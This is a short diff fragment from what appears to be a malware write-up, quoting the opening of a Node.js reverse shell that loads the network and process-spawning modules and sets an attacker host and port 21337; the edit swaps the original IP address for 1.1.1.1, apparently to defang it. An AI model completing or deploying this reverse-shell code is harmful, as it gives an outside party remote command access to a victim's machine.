@@ -39,7 +39,7 @@ Code contains:
 ```
 var net = require('net');
 var spawn = require('child_process').spawn;
-HOST="185.186.247.40";
+HOST="1.1.1.1";
 PORT="21337";
 TIMEOUT="5000";
 if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
